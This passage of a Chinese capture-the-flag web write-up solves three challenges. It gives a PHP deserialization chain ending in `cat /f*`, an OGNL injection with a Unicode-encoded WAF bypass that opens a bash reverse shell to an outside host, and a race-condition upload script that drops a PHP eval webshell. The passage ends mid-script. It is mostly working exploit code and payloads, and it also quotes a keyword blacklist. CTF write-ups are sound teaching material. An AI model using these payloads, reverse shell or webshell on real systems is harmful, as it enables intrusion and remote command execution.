punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$boy</span>  <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"240610708\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">P</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$MyLover</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">B</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">A</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token variable\">$p</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">P</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">-></span> <span class=\"token property\">pop</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">-></span> <span class=\"token property\">Aec</span> <span class=\"token operator\">=</span>  <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">-></span> <span class=\"token property\">nogame</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><blockquote>\n<p>?A_B_C=O:1:&quot;B&quot;:3:{s:3:&quot;pop&quot;;O:1:&quot;A&quot;:3:{s:3:&quot;Aec&quot;;O:1:&quot;B&quot;:3:{s:3:&quot;pop&quot;;N;s:1:&quot;i&quot;;i:1;s:6:&quot;nogame&quot;;O:1:&quot;P&quot;:1:{s:7:&quot;MyLover&quot;;O:1:&quot;B&quot;:3:{s:3:&quot;pop&quot;;N;s:1:&quot;i&quot;;i:1;s:6:&quot;nogame&quot;;N;}}}s:4:&quot;girl&quot;;a:1:{i:0;i:1;}s:3:&quot;boy&quot;;a:1:{i:0;i:2;}}s:1:&quot;i&quot;;i:1;s:6:&quot;nogame&quot;;N;}</p>\n<p>cmd=system('cat /f*');</p>\n</blockquote>\n<h3 id=\"pain\"><a class=\"anchor\" href=\"#pain\">#</a> pain</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTA0ODIjdG9jLTc=\">参考博客 1</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sb25nbG9uZS50b3AvJUU1JUFFJTg5JUU1JTg1JUE4L2phdmEvamF2YSVFNSVBRSU4OSVFNSU4NSVBOC9PR05MLw==\">参考博客 2</span></p>\n<p>1. 用 <code>jd-gui</code>  查看 jdk 文件的内容。</p>\n<p>2. 在 <code>pain.class</code>  内，可以知道这是 <code>Ognl的解析漏洞</code> 。</p>\n<p>3. 跟进 <code>dinner_waf.let_me_see_see</code>  方法，可以看到 waf。</p>\n<blockquote>\n<p>JAVA 语言内部是用 Unicode 表示字符，所以 Unicode 会被自动解析</p>\n</blockquote>\n<p>4. 可以看到，在检测 waf 前，会对 payload 进行一次 url 解码。尝试用 unicode 编码来绕过，发现可行。</p>\n<p>5. 最后用这两条 poc 中的其中一个来进行反弹 shell。</p>\n<p>题目附件：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//pain.class</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token constant\">BOOT</span><span class=\"token operator\">-</span><span class=\"token constant\">INF</span><span class=\"token punctuation\">.</span>classes<span class=\"token punctuation\">.</span>com<span class=\"token punctuation\">.</span>example<span class=\"token punctuation\">.</span>pain<span class=\"token punctuation\">.</span>demos<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>example<span class=\"token punctuation\">.</span>pain<span class=\"token punctuation\">.</span>demos<span class=\"token punctuation\">.</span>dinner_waf</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Map</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">ognl<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Ognl</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">ognl<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">OgnlContext</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">ognl<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">OgnlException</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>web<span class=\"token punctuation\">.</span>bind<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">GetMapping</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>web<span class=\"token punctuation\">.</span>bind<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">RestController</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token annotation punctuation\">@RestController</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> pain <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token annotation punctuation\">@GetMapping</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"/\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token class-name\">Welcome</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">\"It's so beautiful , Litang.\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token annotation punctuation\">@GetMapping</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"/start\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token class-name\">MyPain</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> payload<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">OgnlException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>dinner_waf<span class=\"token punctuation\">.</span><span class=\"token function\">let_me_see_see</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>      <span class=\"token class-name\">OgnlContext</span> ognlContext <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">OgnlContext</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      <span class=\"token class-name\">Object</span> ognl <span class=\"token operator\">=</span> <span class=\"token class-name\">Ognl</span><span class=\"token punctuation\">.</span><span class=\"token function\">parseExpression</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      <span class=\"token class-name\">Object</span> value <span class=\"token operator\">=</span> <span class=\"token class-name\">Ognl</span><span class=\"token punctuation\">.</span><span class=\"token function\">getValue</span><span class=\"token punctuation\">(</span>ognl<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Map</span><span class=\"token punctuation\">)</span>ognlContext<span class=\"token punctuation\">,</span> ognlContext<span class=\"token punctuation\">.</span><span class=\"token function\">getRoot</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span>value<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> </pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">\"Feel my pain\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//dinner_waf.class</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token constant\">BOOT</span><span class=\"token operator\">-</span><span class=\"token constant\">INF</span><span class=\"token punctuation\">.</span>classes<span class=\"token punctuation\">.</span>com<span class=\"token punctuation\">.</span>example<span class=\"token punctuation\">.</span>pain<span class=\"token punctuation\">.</span>demos<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>net<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">URLDecoder</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Locale</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> dinner_waf <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> black_list <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token string\">\"Runtime\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"exec\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"get\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"class\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"+\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Process\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Script\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"eval\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"invoke\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"forName\"</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">boolean</span> <span class=\"token function\">let_me_see_see</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> payload<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">.</span><span class=\"token function\">isEmpty</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token class-name\">String</span> decode_payload <span class=\"token operator\">=</span> <span class=\"token class-name\">URLDecoder</span><span class=\"token punctuation\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> s <span class=\"token operator\">:</span> black_list<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>decode_payload<span class=\"token punctuation\">.</span><span class=\"token function\">toLowerCase</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Locale</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ROOT</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">contains</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">.</span><span class=\"token function\">toLowerCase</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Locale</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ROOT</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>payload:</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#编码前</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">(</span>new java.lang.ProcessBuilder<span class=\"token punctuation\">(</span>new java.lang.String<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"bash\"</span>,<span class=\"token string\">\"-c\"</span>,<span class=\"token string\">\"bash -i >&amp; /dev/tcp/ip/port 0>&amp;1\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">))</span>.start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#编码后</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>/start?payload<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>new%20java.lang.%5Cu0050%5Cu0072%5Cu006f%5Cu0063%5Cu0065%5Cu0073%5Cu0073%5Cu0042%5Cu0075%5Cu0069%5Cu006c%5Cu0064%5Cu0065%5Cu0072<span class=\"token punctuation\">(</span>new%20java.lang.String%5B%5D%7B%22bash%22%2C%22-c%22%2C%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F7654du6216.zicp.fun%2F33699%200%3E%261%22%7D<span class=\"token punctuation\">))</span>.start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"你能跟得上我的speed吗\"><a class=\"anchor\" href=\"#你能跟得上我的speed吗\">#</a> 你能跟得上我的 speed 吗</h3>\n<p>题目：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"size\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">></span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"error\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"错误！！！！！！\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$filename</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"./uploads/\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"tmp_name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">0.01</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"你根本就没有上传，你到底在干什么？！\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>smile.gif<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">alt</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span><span class=\"token punctuation\">></span></span>当你看见我的时候,你已经输了<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span><span class=\"token punctuation\">></span></span>一次战胜不了我，那就多来几次吧，万一你运气好比我快呢？<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>条件竞争，储存 0.01 秒后删除文件</p>\n<p>参考</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzODI5NTU1L2FydGljbGUvZGV0YWlscy8xMjY5NzA0ODM=\">文件上传之条件竞争</span></p>\n<p>基本跟上面教程中的操作一模一样，开两个爆破，一个传马，一个访问</p>\n<p>或者用官方给的脚本：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> threading</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">upload</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>upload_result <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">+</span><span class=\"token string\">\"upload.php\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>files<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"file\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"1.php\"</span><span class=\"token punctuation\">,</span>\"<span class=\"token operator\">&lt;</span>?php</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>$op<span class=\"token operator\">=</span>fopen<span class=\"token punctuation\">(</span>\\\"shell<span class=\"token punctuation\">.</span>php\\\"<span class=\"token punctuation\">,</span>\\\"a<span class=\"token operator\">+</span>\\\"<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>fwrite<span class=\"token punctuation\">(</span>$op<span class=\"token punctuation\">,</span>'<span class=\"token operator\">&lt;</span>?php @<span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>$_POST<span class=\"token punctuation\">[</span>cmd<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>?</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">></span>'<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>fclose<span class=\"token punctuation\">(</span>$op<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>echo<span class=\"token punctuation\">(</span><span class=\"token number\">333</span><span class=\"token punctuation\">)</span> ?<span class=\"token operator\">></span>\"<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>headers<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'Connection'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'close'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">global</span> stop_threads</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">if</span> stop_threads<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">getshell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>getshell_result <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">+</span><span class=\"token string\">\"uploads/1.php\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>headers<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'Connection'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'close'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token string\">\"333\"</span> <span class=\"token keyword\">in</span> getshell_result<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getshell!!!\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">global</span> stop_threads</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>stop_threads <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>stop_threads <span class=\"token 